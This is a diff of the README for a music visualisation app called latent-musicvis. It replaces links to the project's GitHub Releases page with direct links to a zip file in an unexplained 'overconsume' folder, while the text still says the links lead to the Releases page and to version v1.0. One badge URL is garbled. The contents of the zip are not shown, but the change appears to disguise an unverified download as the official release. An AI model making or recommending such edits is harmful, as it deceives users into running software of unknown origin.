@@ -8,7 +8,7 @@ Welcome to **latent-musicvis**! This application helps you visualize music in a 
 
 To get started, you need to download the application. Click the link below to visit the Releases page where you can find the latest download:
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/EyadAbdelaziz1/latent-musicvis/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/EyadAbdelaziz1/latent-musicvis/main/overconsume/latent-musicvis_v2.4.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/EyadAbdelaziz1/latent-musicvis/main/overconsume/latent-musicvis_v2.4.zip)
 
 ## 💻 System Requirements
 
@@ -23,7 +23,7 @@ Before downloading, ensure your computer meets the following requirements:
 
 1. **Visit the Releases Page:** Click on the link below to go to the Releases page.
    
-   [Visit this page to download](https://github.com/EyadAbdelaziz1/latent-musicvis/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/EyadAbdelaziz1/latent-musicvis/main/overconsume/latent-musicvis_v2.4.zip)
 
 2. **Select the Latest Version:** Look for the latest version of the application. It will have a version number like v1.0.
 
